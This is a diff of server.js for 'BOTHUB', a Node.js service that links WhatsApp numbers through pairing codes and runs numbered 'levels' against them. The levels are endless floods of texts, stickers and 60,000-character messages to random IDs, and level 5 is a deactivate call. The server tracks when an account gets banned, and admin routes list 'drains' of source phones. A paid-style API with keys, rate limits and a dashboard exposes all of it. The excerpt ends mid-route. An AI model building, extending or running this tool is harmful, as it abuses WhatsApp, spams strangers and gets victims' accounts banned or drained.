@@ -1,37 +1,36 @@
-// BOTHUB — pairing + levels + drain + deactivate + admin + public API + accounts + dashboard + theme registry.
+// BOTHUB — server.js
+// Pairing logic lives in utils/pairing.js (ported from index.js).
+// Admin routes require BOTH ?token=… (URL) AND a password-issued admin session
+// (X-Admin-Session header). Set ADMIN_TOKEN and ADMIN_PASSWORD in the env.
 
 import express from 'express';
 import fs from 'node:fs';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import { fileURLToPath } from 'node:url';
-import pino from 'pino';
-import makeWASocket, {
-  useMultiFileAuthState,
-  fetchLatestBaileysVersion,
-  DisconnectReason,
-  Browsers,
-} from '@whiskeysockets/baileys';
+import { createSession, purgeSessionDir } from './utils/pairing.js';
 import { deactivate } from './utils/deactivate.js';
 
-process.on('unhandledRejection', (err) => console.warn('[unhandledRejection]', err?.message || err));
-process.on('uncaughtException', (err) => console.error('[uncaughtException]', err?.message || err));
+process.on('unhandledRejection', (e) => console.warn('[unhandledRejection]', e?.message || e));
+process.on('uncaughtException', (e) => console.error('[uncaughtException]', e?.message || e));
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PORT = process.env.PORT || 3000;
 const AUTH_DIR = process.env.AUTH_DIR || './auth';
 const DATA_DIR = process.env.DATA_DIR || './data';
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || null;
 const RESEND_API_KEY = process.env.RESEND_API_KEY || null;
 const MAIL_FROM = process.env.MAIL_FROM || 'bothub <onboarding@resend.dev>';
 const BIG = 'x'.repeat(60000);
+const ADMIN_SESSION_TTL = 8 * 60 * 60 * 1000;
 
 const app = express();
 app.use(express.json({ limit: '8mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-// ── Files ──
+// ── files ──
 const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');
 const ACCOUNTS_FILE = path.join(DATA_DIR, 'accounts.json');
 const USER_SESSIONS_FILE = path.join(DATA_DIR, 'user_sessions.json');
@@ -46,28 +45,17 @@ function writeJSON(file, data) {
   fs.writeFileSync(file, JSON.stringify(data, null, 2));
 }
 
-// ── Session helpers ──
+// ── whatsapp session helpers ──
 function sessionDir(phone) { return path.join(AUTH_DIR, phone); }
-function purgeAuthDir(phone) {
-  const dir = sessionDir(phone);
-  try { if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); console.log(`[purge] removed ${dir}`); } }
-  catch (err) { console.warn(`[purge] failed to remove ${dir}:`, err?.message || err); }
-}
-function disconnectSession(phone) {
-  const sess = sessions.get(phone);
-  if (sess?.sock) { try { sess.sock.ev.removeAllListeners(); } catch {} try { sess.sock.end(undefined); } catch {} }
-  sessions.delete(phone);
-  purgeAuthDir(phone);
-}
+function purgeAuthDir(phone) { purgeSessionDir(sessionDir(phone)); }
 
-// ── Themes ──
-const BUILTIN_THEME_NAMES = ['solo','sword','meta','pepe','isagi','heartbreak','restricted','banned','nebula','grid','waves','digits','matrix','particles','starfield'];
-
+// ── themes registry ──
+const BUILTIN_THEME_NAMES = ['nebula','grid','waves','digits','matrix','particles','starfield'];
 function loadThemes() {
-  const raw = readJSON(THEMES_FILE, { custom: [], disabled: [] });
-  if (!raw.custom) raw.custom = [];
-  if (!raw.disabled) raw.disabled = [];
-  return raw;
+  const t = readJSON(THEMES_FILE, { custom: [], disabled: [] });
+  if (!Array.isArray(t.custom)) t.custom = [];
+  if (!Array.isArray(t.disabled)) t.disabled = [];
+  return t;
 }
 function saveThemes(t) { writeJSON(THEMES_FILE, t); }
 
@@ -82,12 +70,12 @@ function generateKey() {
 }
 function findKey(k) { return loadKeys().find((e) => e.key === k); }
 function touchKey(k) {
-  const keys = loadKeys(); const entry = keys.find((e) => e.key === k);
-  if (entry) { entry.lastUsed = new Date().toISOString(); entry.uses = (entry.uses || 0) + 1; saveKeys(keys); }
+  const keys = loadKeys(); const e = keys.find((x) => x.key === k);
+  if (e) { e.lastUsed = new Date().toISOString(); e.uses = (e.uses || 0) + 1; saveKeys(keys); }
 }
 function revokeKeyById(id) {
-  const keys = loadKeys(); const entry = keys.find((e) => e.id === id);
-  if (!entry) return false; entry.revoked = true; saveKeys(keys); return true;
+  const keys = loadKeys(); const e = keys.find((x) => x.id === id);
+  if (!e) return false; e.revoked = true; saveKeys(keys); return true;
 }
 function requireApiKey(req, res, next) {
   const h = String(req.headers.authorization || '');
@@ -100,11 +88,12 @@ function requireApiKey(req, res, next) {
   req.apiKey = entry; next();
 }
 
-// ── Accounts ──
+// ── accounts ──
 function loadAccounts() { return readJSON(ACCOUNTS_FILE, []); }
 function saveAccounts(a) { writeJSON(ACCOUNTS_FILE, a); }
 function loadUserSessions() { return readJSON(USER_SESSIONS_FILE, []); }
 function saveUserSessions(s) { writeJSON(USER_SESSIONS_FILE, s); }
+
 function hashPassword(pw) {
   const salt = crypto.randomBytes(16).toString('hex');
   const hash = crypto.scryptSync(pw, salt, 64).toString('hex');
@@ -124,7 +113,10 @@ function gen6() { return String(crypto.randomInt(0, 1000000)).padStart(6, '0'); 
 async function sendCode(email, code, purpose) {
   const subject = purpose === 'login' ? 'Your bothub login code' : 'Verify your bothub account';
   const text = `Your code is: ${code}\n\nIt expires in 10 minutes.`;
-  if (!RESEND_API_KEY) { console.log(`[email:${purpose}] to=${email} code=${code}`); return { sent: false, dev: true }; }
+  if (!RESEND_API_KEY) {
+    console.log(`[email:${purpose}] to=${email} code=${code} (no RESEND_API_KEY)`);
+    return { sent: false, dev: true };
+  }
   try {
     const r = await fetch('https://api.resend.com/emails', {
       method: 'POST',
@@ -134,7 +126,7 @@ async function sendCode(email, code, purpose) {
     if (!r.ok) throw new Error(`resend ${r.status}`);
     return { sent: true };
   } catch (err) {
-    console.warn(`[email] send failed for ${email}:`, err?.message || err);
+    console.warn(`[email] failed for ${email}:`, err?.message || err);
     console.log(`[email:fallback] to=${email} code=${code}`);
     return { sent: false, error: err?.message };
   }
@@ -153,6 +145,26 @@ function requireUser(req, res, next) {
   req.account = account; req.session = entry; next();
 }
 
+// ── admin auth (token + password) ──
+const adminSessions = new Map(); // adminSession -> { created, expires }
+
+function adminPageAuthed(req) {
+  if (!ADMIN_TOKEN) return false;
+  return (req.query?.token || req.body?.token) === ADMIN_TOKEN;
+}
+function requireAdmin(req, res, next) {
+  if (!ADMIN_TOKEN) return res.status(404).end();
+  const token = req.query?.token || req.body?.token;
+  if (token !== ADMIN_TOKEN) return res.status(404).end();
+  if (!ADMIN_PASSWORD) return next(); // password gate disabled
+  const s = req.headers['x-admin-session'];
+  if (!s) return res.status(401).json({ error: 'admin_auth_required' });
+  const entry = adminSessions.get(s);
+  if (!entry) return res.status(401).json({ error: 'invalid_admin_session' });
+  if (entry.expires < Date.now()) { adminSessions.delete(s); return res.status(401).json({ error: 'expired_admin_session' }); }
+  next();
+}
+
 // ── Auth routes ──
 app.post('/api/auth/register', (req, res) => {
   const email = String(req.body?.email ?? '').trim().toLowerCase();
@@ -166,7 +178,6 @@ app.post('/api/auth/register', (req, res) => {
   accounts.push(account); saveAccounts(accounts);
   res.status(201).json({ ok: true, account: publicAccount(account) });
 });
-
 app.post('/api/auth/login', async (req, res) => {
   const email = String(req.body?.email ?? '').trim().toLowerCase();
   const password = String(req.body?.password ?? '');
@@ -178,7 +189,6 @@ app.post('/api/auth/login', async (req, res) => {
   const result = await sendCode(email, code, 'login');
   res.json({ pendingToken: token, emailed: result.sent, devCode: result.dev ? code : undefined });
 });
-
 app.post('/api/auth/verify', (req, res) => {
   const pendingToken = String(req.body?.pendingToken ?? '');
   const code = String(req.body?.code ?? '');
@@ -195,14 +205,13 @@ app.post('/api/auth/verify', (req, res) => {
   const account = loadAccounts().find((a) => a.id === entry.accountId);
   res.json({ sessionToken, expires, account: publicAccount(account) });
 });
-
 app.get('/api/auth/me', requireUser, (req, res) => res.json(publicAccount(req.account)));
 app.post('/api/auth/logout', requireUser, (req, res) => {
   saveUserSessions(loadUserSessions().filter((s) => s.token !== req.session.token));
   res.json({ ok: true });
 });
 
-// ── Account-scoped keys ──
+// ── Account-scoped keys and sessions ──
 app.get('/api/account/keys', requireUser, (req, res) => {
   res.json(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => ({
     id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
@@ -216,17 +225,15 @@ app.post('/api/account/keys', requireUser, (req, res) => {
 });
 app.post('/api/account/keys/revoke', requireUser, (req, res) => {
   const id = String(req.body?.id ?? '');
-  const keys = loadKeys(); const entry = keys.find((k) => k.id === id && k.accountId === req.account.id);
-  if (!entry) return res.status(404).json({ error: 'not_found' });
-  entry.revoked = true; saveKeys(keys); res.json({ ok: true });
+  const keys = loadKeys(); const e = keys.find((k) => k.id === id && k.accountId === req.account.id);
+  if (!e) return res.status(404).json({ error: 'not_found' });
+  e.revoked = true; saveKeys(keys); res.json({ ok: true });
 });
-
-// ── Account-scoped sessions ──
 app.get('/api/account/sessions', requireUser, (req, res) => {
-  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
+  const mine = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
   const out = [];
   for (const [phone, s] of sessions.entries()) {
-    if (myKeys.has(s.key)) out.push({ number: phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
+    if (mine.has(s.key)) out.push({ number: phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
   }
   out.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
   res.json(out);
@@ -235,106 +242,97 @@ app.post('/api/account/sessions/end', requireUser, (req, res) => {
   const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
   const s = sessions.get(phone);
   if (!s) return res.status(404).json({ error: 'session_not_found' });
-  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
-  if (!myKeys.has(s.key)) return res.status(403).json({ error: 'not_your_session' });
-  disconnectSession(phone); res.json({ ok: true });
+  const mine = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
+  if (!mine.has(s.key)) return res.status(403).json({ error: 'not_your_session' });
+  endSession(phone); res.json({ ok: true });
 });
 
 // ── WhatsApp sessions ──
-const sessions = new Map();
-function randomJid() { const d = String(Math.floor(Math.random() * 9e11) + 1e11); return `${d}@s.whatsapp.net`; }
-function tick(sess) { sess.sends++; if (sess.sends % 500 === 0) { const s = (Date.now() - sess.startedAt) / 1000; console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`); } }
-async function flood(sess) { while (true) { try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {} tick(sess); } }
-async function stickerLoop(sess) { const p = path.join(__dirname, 'assets', 'sticker.png'); if (!fs.existsSync(p)) return; const buf = fs.readFileSync(p); while (true) { try { await sess.sock.sendMessage(randomJid(), { sticker: buf }); } catch {} tick(sess); } }
-async function bigLoop(sess) { while (true) { try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {} tick(sess); } }
+const sessions = new Map(); // phone -> { phone, level, key, status, code, sends, startedAt, bannedAt, createdAt, session }
 
-async function runLevel(sess) {
-  sess.startedAt = Date.now(); sess.sends = 0;
-  console.log(`[${sess.phone}] level ${sess.level} starting`);
-  if (sess.level === 5) {
-    try { const r = await deactivate(sess.sock, { logger: console }); console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r)); }
-    catch (err) { console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err); }
+function randomJid() { const d = String(Math.floor(Math.random() * 9e11) + 1e11); return `${d}@s.whatsapp.net`; }
+function tick(s) { s.sends++; if (s.sends % 500 === 0) { const t = (Date.now() - s.startedAt) / 1000; console.log(`[${s.phone}] sent ${s.sends} | ${(s.sends / t).toFixed(0)}/s`); } }
+async function flood(sock, s) { while (true) { try { await sock.sendMessage(randomJid(), { text: 'x' }); } catch {} tick(s); } }
+async function stickerLoop(sock, s) { const p = path.join(__dirname, 'assets', 'sticker.png'); if (!fs.existsSync(p)) return; const buf = fs.readFileSync(p); while (true) { try { await sock.sendMessage(randomJid(), { sticker: buf }); } catch {} tick(s); } }
+async function bigLoop(sock, s) { while (true) { try { await sock.sendMessage(randomJid(), { text: BIG }); } catch {} tick(s); } }
+
+async function runLevel(sock, s) {
+  s.startedAt = Date.now(); s.sends = 0;
+  console.log(`[${s.phone}] level ${s.level} starting${s.key ? ` (key=${s.key.slice(0, 10)}…)` : ''}`);
+  if (s.level === 5) {
+    try { const r = await deactivate(sock, { logger: console }); console.log(`[${s.phone}] deactivate response:`, JSON.stringify(r)); }
+    catch (err) { console.warn(`[${s.phone}] deactivate failed:`, err?.message || err); }
     return;
   }
-  if (sess.level === 1 || sess.level === 2) return flood(sess);
-  if (sess.level === 3) { stickerLoop(sess); return flood(sess); }
-  if (sess.level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
+  if (s.level === 1 || s.level === 2) return flood(sock, s);
+  if (s.level === 3) { stickerLoop(sock, s); return flood(sock, s); }
+  if (s.level === 4) { stickerLoop(sock, s); bigLoop(sock, s); return flood(sock, s); }
+}
+
+function endSession(phone) {
+  const s = sessions.get(phone);
+  if (s?.session) s.session.end();
+  sessions.delete(phone);
+  purgeAuthDir(phone);
 }
 
 async function startPairing(phone, level, key = null) {
   const existing = sessions.get(phone);
-  if (existing?.sock) { try { existing.sock.ev.removeAllListeners(); } catch {} try { existing.sock.end(undefined); } catch {} }
-  fs.mkdirSync(sessionDir(phone), { recursive: true });
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
-  let version; try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
+  if (existing?.session) existing.session.end();
 
-  const sock = makeWASocket({
-    ...(version ? { version } : {}), auth: state, logger: pino({ level: 'silent' }),
-    printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'),
-    markOnlineOnConnect: false, syncFullHistory: false, shouldSyncHistoryMessage: () => false,
-  });
-
-  const sess = existing && existing.status === 'reconnecting'
-    ? Object.assign(existing, { sock })
-    : { phone, level, sock, key, status: 'pending', code: null, sends: 0, startedAt: 0, bannedAt: null, createdAt: new Date().toISOString() };
+  const sess = {
+    phone, level, key,
+    status: 'pending', code: null, sends: 0,
+    startedAt: 0, bannedAt: null,
+    createdAt: new Date().toISOString(),
+    session: null,
+  };
   sessions.set(phone, sess);
-  sock.ev.on('creds.update', saveCreds);
 
-  let resolveCode; const codePromise = new Promise((res) => { resolveCode = res; });
-  let pairingRequested = false;
-
-  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
-    if (qr && !pairingRequested && !sock.authState.creds.registered) {
-      pairingRequested = true;
-      try {
-        const raw = await sock.requestPairingCode(phone);
-        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
-        sess.code = code; resolveCode(code);
-        console.log(`[${phone}] pairing code: ${code}`);
-      } catch (err) { pairingRequested = false; console.error(`[${phone}] pairing attempt failed:`, err?.message || err); }
-    }
-    if (connection === 'open') { sess.status = 'connected'; console.log(`[${phone}] connected as ${sock.user?.id}`); runLevel(sess); }
-    if (connection === 'close') {
-      const code = lastDisconnect?.error?.output?.statusCode;
-      const ts = new Date().toISOString();
-      fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
-      fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} close code=${code}\n`);
-      if (sess.status !== 'connected' && sess.status !== 'reconnecting') {
-        const banned = code === 401 || code === 403;
-        sess.status = banned ? 'banned' : 'expired'; sess.bannedAt = banned ? ts : null; sess.sock = null; purgeAuthDir(phone);
-        if (banned) { fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} *** BANNED ***\n`); console.log(`[${phone}] *** BANNED ***`); }
-        else console.log(`[${phone}] close code=${code} during pairing — expired, not reconnecting`);
-        return;
+  const session = createSession({
+    phone,
+    sessionDir: sessionDir(phone),
+    logger: console,
+    onOpen: (sock, id) => {
+      sess.status = 'connected';
+      console.log(`[${phone}] connected as +${id}`);
+      runLevel(sock, sess).catch((err) => console.error(`[${phone}] runLevel:`, err?.message || err));
+    },
+    onClose: ({ code, banned, replaced }) => {
+      console.log(`[${phone}] closed code=${code ?? 'n/a'}${banned ? ' (banned)' : ''}${replaced ? ' (replaced)' : ''}`);
+      if (banned) {
+        sess.status = 'banned';
+        sess.bannedAt = new Date().toISOString();
+        purgeAuthDir(phone);
+      } else if (replaced) {
+        sess.status = 'replaced';
+      } else if (sess.status !== 'connected') {
+        sess.status = 'expired';
       }
-      if (code === 401 || code === 403) { sess.status = 'banned'; sess.bannedAt = ts; sess.sock = null; purgeAuthDir(phone); return; }
-      console.log(`[${phone}] close code=${code} — reconnecting`);
-      sess.status = 'reconnecting';
-      setTimeout(() => {
-        const s = sessions.get(phone); if (!s || s.status === 'banned') return;
-        startPairing(phone, level, key).catch((err) => console.warn(`[${phone}] reconnect failed:`, err?.message || err));
-      }, 3000);
-    }
+    },
+    autoReconnect: true,
   });
+  sess.session = session;
 
-  if (!sock.authState.creds.registered) {
-    const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('pairing timeout')), 25000));
-    return { code: await Promise.race([codePromise, timeout]) };
-  }
-  return { code: sess.code || null, alreadyRegistered: true };
+  const code = await session.code;      // resolves with "XXXX-XXXX" or null if already paired
+  sess.code = code;
+  return { code, alreadyRegistered: code === null };
 }
 
 // ── Web pairing ──
 app.post('/api/pair/start', async (req, res) => {
   const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
   const level = parseInt(req.body?.level, 10);
-  if (!phone) return res.status(400).json({ error: 'phone required' });
-  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level 1-5 required' });
+  if (!/^[1-9]\d{7,14}$/.test(phone)) return res.status(400).json({ error: 'invalid_phone' });
+  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
   try {
     const { code, alreadyRegistered } = await startPairing(phone, level, null);
-    res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
-  } catch (err) { console.error('[pair/start]', err?.message || err); res.status(500).json({ error: err?.message || 'pairing failed' }); }
+    res.json({ phone, level, code, alreadyRegistered });
+  } catch (err) {
+    console.error('[pair/start]', err?.message || err);
+    res.status(500).json({ error: err?.message || 'pairing failed' });
+  }
 });
-
 app.get('/api/pair/status', (req, res) => {
   const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
   const s = sessions.get(phone);
@@ -342,7 +340,7 @@ app.get('/api/pair/status', (req, res) => {
   res.json({ status: s.status, code: s.code, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt });
 });
 
-// ── Themes (public read) ──
+// ── Themes (public) ──
 app.get('/api/themes', (req, res) => {
   const t = loadThemes();
   res.json({ custom: t.custom, disabled: t.disabled, builtins: BUILTIN_THEME_NAMES });
@@ -352,23 +350,24 @@ app.get('/api/themes', (req, res) => {
 app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
   const phone = String(req.body?.number ?? '').replace(/\D/g, '');
   const level = parseInt(req.body?.level, 10);
-  if (!phone) return res.status(400).json({ error: 'number_required' });
+  if (!/^[1-9]\d{7,14}$/.test(phone)) return res.status(400).json({ error: 'invalid_phone' });
   if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
   const key = req.apiKey.key;
   const mine = [...sessions.values()].filter((s) => s.key === key);
-  if (mine.filter((s) => s.status !== 'banned').length >= 3) return res.status(429).json({ error: 'too_many_active_sessions' });
+  if (mine.filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length >= 3) return res.status(429).json({ error: 'too_many_active_sessions' });
   const now = Date.now();
   if (mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length >= 20) return res.status(429).json({ error: 'rate_limit_exceeded' });
   try {
-    const { code } = await startPairing(phone, level, key);
+    const { code, alreadyRegistered } = await startPairing(phone, level, key);
     touchKey(key);
-    res.status(201).json({ number: phone, level, code, expiresIn: 60 });
+    res.status(201).json({ number: phone, level, code, expiresIn: 60, alreadyRegistered });
   } catch (err) { res.status(500).json({ error: err?.message || 'pairing_failed' }); }
 });
 app.get('/api/v1/sessions', requireApiKey, (req, res) => {
   const key = req.apiKey.key;
   res.json([...sessions.values()].filter((s) => s.key === key).map((s) => ({
-    number: s.phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
+    number: s.phone, level: s.level, status: s.status, sends: s.sends,
+    startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
   })));
 });
 app.get('/api/v1/sessions/:number', requireApiKey, (req, res) => {
@@ -383,7 +382,7 @@ app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
   const s = sessions.get(phone);
   if (!s) return res.status(404).json({ error: 'session_not_found' });
   if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
-  disconnectSession(phone); res.json({ ok: true });
+  endSession(phone); res.json({ ok: true });
 });
 app.get('/api/v1/me', requireApiKey, (req, res) => {
   const key = req.apiKey.key;
@@ -393,58 +392,106 @@ app.get('/api/v1/me', requireApiKey, (req, res) => {
     prefix: key.slice(0, 12) + '…', label: req.apiKey.label,
     created: req.apiKey.created, lastUsed: req.apiKey.lastUsed, uses: req.apiKey.uses,
     limits: {
-      activeSessions: { used: mine.filter((s) => s.status !== 'banned').length, max: 3 },
+      activeSessions: { used: mine.filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length, max: 3 },
       hourlySessions: { used: mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length, max: 20 },
     },
     stats: { totalSessions: mine.length, totalSends: mine.reduce((a, s) => a + (s.sends || 0), 0) },
   });
 });
 
-// ── Admin / panel ──
-function adminAuthed(req) {
-  if (!ADMIN_TOKEN) return false;
-  return (req.query?.token || req.body?.token) === ADMIN_TOKEN;
-}
-app.get('/api/panel/keys', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  res.json(loadKeys().map((k) => ({ id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label, accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked })));
-});
-app.post('/api/panel/keys', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
-  const keys = loadKeys(); keys.push(entry); saveKeys(keys); res.status(201).json(entry);
-});
-app.post('/api/panel/keys/revoke', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
-});
-app.get('/api/admin/sessions', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  const out = [];
-  for (const [phone, s] of sessions.entries()) out.push({ phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, key: s.key || null });
-  res.json(out);
-});
-app.get('/api/admin/drains', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  const out = [];
-  for (const [id, d] of drains.entries()) out.push({ id, destJid: d.destJid, sourcePhone: d.sourcePhone, status: d.status, total: d.total, done: d.done, errors: d.errors });
-  res.json(out);
-});
-app.post('/api/admin/disconnect', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
-  if (!phone) return res.status(400).json({ error: 'phone required' });
-  disconnectSession(phone); res.json({ ok: true });
-});
-app.post('/api/admin/purge-all', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
-  for (const phone of [...sessions.keys()]) disconnectSession(phone);
-  res.json({ ok: true });
+// ── Admin password gate ──
+app.post('/api/admin/auth', (req, res) => {
+  if (!ADMIN_TOKEN) return res.status(404).end();
+  const token = req.body?.token;
+  if (token !== ADMIN_TOKEN) return res.status(404).end();
+  if (!ADMIN_PASSWORD) {
+    // password gate disabled — hand out a permanent session immediately
+    return res.json({ adminSession: 'no-password-required', expires: null });
+  }
+  const pw = String(req.body?.password ?? '');
+  if (!pw) return res.status(400).json({ error: 'password_required' });
+  if (pw !== ADMIN_PASSWORD) return res.status(401).json({ error: 'invalid_password' });
+  const s = crypto.randomBytes(32).toString('hex');
+  const expires = Date.now() + ADMIN_SESSION_TTL;
+  adminSessions.set(s, { created: Date.now(), expires });
+  res.json({ adminSession: s, expires });
 });
 
-// ── Theme management (admin) ──
-app.post('/api/admin/themes', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
+// ── Admin routes (require token + admin session) ──
+app.get('/api/admin/sessions', requireAdmin, (req, res) => {
+  res.json([...sessions.values()].map((s) => ({
+    phone: s.phone, level: s.level, status: s.status, sends: s.sends,
+    startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
+    key: s.key ? s.key.slice(0, 12) + '…' : null,
+  })));
+});
+app.get('/api/admin/drains', requireAdmin, (req, res) => {
+  res.json([...drains.entries()].map(([id, d]) => ({
+    id, destJid: d.destJid, sourcePhone: d.sourcePhone,
+    status: d.status, total: d.total, done: d.done, errors: d.errors,
+  })));
+});
+app.post('/api/admin/disconnect', requireAdmin, (req, res) => {
+  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
+  if (!phone) return res.status(400).json({ error: 'phone_required' });
+  endSession(phone); res.json({ ok: true });
+});
+app.post('/api/admin/purge-all', requireAdmin, (req, res) => {
+  for (const phone of [...sessions.keys()]) endSession(phone);
+  res.json({ ok: true });
+});
+app.get('/api/admin/keys', requireAdmin, (req, res) => {
+  res.json(loadKeys().map((k) => ({
+    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
+    accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
+  })));
+});
+app.post('/api/admin/keys', requireAdmin, (req, res) => {
+  const keys = loadKeys();
+  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
+  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
+});
+app.post('/api/admin/keys/revoke', requireAdmin, (req, res) => {
+  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
+});
+app.get('/api/admin/accounts', requireAdmin, (req, res) => {
+  res.json(loadAccounts().map((a) => ({
+    id: a.id, email: a.email, created: a.created,
+    keys: loadKeys().filter((k) => k.accountId === a.id).length,
+    sessions: (() => {
+      const mine = new Set(loadKeys().filter((k) => k.accountId === a.id).map((k) => k.key));
+      return [...sessions.values()].filter((s) => mine.has(s.key)).length;
+    })(),
+  })));
+});
+app.post('/api/admin/accounts/delete', requireAdmin, (req, res) => {
+  const id = String(req.body?.id ?? '');
+  saveAccounts(loadAccounts().filter((a) => a.id !== id));
+  res.json({ ok: true });
+});
+app.get('/api/admin/system', requireAdmin, (req, res) => {
+  const mem = process.memoryUsage();
+  res.json({
+    uptime: process.uptime(),
+    startedAt: new Date(Date.now() - process.uptime() * 1000).toISOString(),
+    node: process.version,
+    platform: process.platform,
+    memory: { rss: mem.rss, heapUsed: mem.heapUsed, heapTotal: mem.heapTotal },
+    counts: {
+      sessions: sessions.size,
+      activeSessions: [...sessions.values()].filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length,
+      drains: drains.size,
+      keys: loadKeys().length,
+      accounts: loadAccounts().length,
+      customThemes: loadThemes().custom.length,
+      adminSessions: adminSessions.size,
+    },
+  });
+});
+app.get('/api/admin/themes', requireAdmin, (req, res) => {
+  res.json({ ...loadThemes(), builtins: BUILTIN_THEME_NAMES });
+});
+app.post('/api/admin/themes', requireAdmin, (req, res) => {
   const { name, accent, glow, src } = req.body || {};
   if (!name || !src) return res.status(400).json({ error: 'name_and_src_required' });
   const t = loadThemes();
@@ -459,29 +506,44 @@ app.post('/api/admin/themes', (req, res) => {
   t.custom.push(theme); saveThemes(t);
   res.status(201).json(theme);
 });
-app.post('/api/admin/themes/delete', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
+app.post('/api/admin/themes/delete', requireAdmin, (req, res) => {
   const id = String(req.body?.id ?? '');
   const t = loadThemes();
   t.custom = t.custom.filter((c) => c.id !== id);
-  saveThemes(t);
-  res.json({ ok: true });
+  saveThemes(t); res.json({ ok: true });
 });
-app.post('/api/admin/themes/toggle', (req, res) => {
-  if (!adminAuthed(req)) return res.status(404).end();
+app.post('/api/admin/themes/toggle', requireAdmin, (req, res) => {
   const name = String(req.body?.name ?? '');
   const enabled = !!req.body?.enabled;
   const t = loadThemes();
-  const disabled = new Set(t.disabled || []);
-  if (enabled) disabled.delete(name); else disabled.add(name);
-  t.disabled = [...disabled];
+  const d = new Set(t.disabled);
+  if (enabled) d.delete(name); else d.add(name);
+  t.disabled = [...d];
   saveThemes(t);
   res.json({ ok: true, disabled: t.disabled });
 });
 
-// ── Drain ──
+// ── Panel routes (same auth) ──
+app.get('/api/panel/keys', requireAdmin, (req, res) => {
+  res.json(loadKeys().map((k) => ({
+    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
+    accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
